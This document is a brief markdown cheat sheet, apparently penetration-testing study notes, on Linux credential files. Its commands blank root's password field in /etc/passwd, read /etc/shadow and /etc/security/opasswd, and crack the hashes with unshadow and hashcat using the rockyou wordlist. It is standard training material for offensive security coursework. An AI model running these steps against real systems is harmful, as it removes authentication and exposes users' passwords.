# Passwd File
#### Editing /etc/passwd - Before
```shell
root:x:0:0:root:/root:/bin/bash
```
#### Editing /etc/passwd - After
```shell
root::0:0:root:/root:/bin/bash
```
#### Root without Password
```shell
head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash
```
# Shadow File
#### Shadow Format

| **Username** | **Encrypted Password** | **Last PW Change** | **Min. PW Age** | **Max. PW Age** | **Warning Period** | **Inactivity Period** | **Expiration Date** | **Unused** |
|--------------|------------------------|--------------------|-----------------|-----------------|--------------------|-----------------------|---------------------|------------|
| cry0l1t3     | $6$wBRzy$...SNIP...x9cDWUxW1 | 18937              | 0               | 99999           | 7                  | :                     | :                   | :          |
#### Shadow File
```shell
sudo cat /etc/shadow
```
# Opasswd
```shell
sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```
# Cracking Linux Credentials
#### Unshadow
```shell
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
#### Hashcat - Cracking Unshadowed Hashes
```shell
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```
#### Hashcat - Cracking MD5 Hashes
```shell
cat md5-hashes.list
```

```shell
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
```
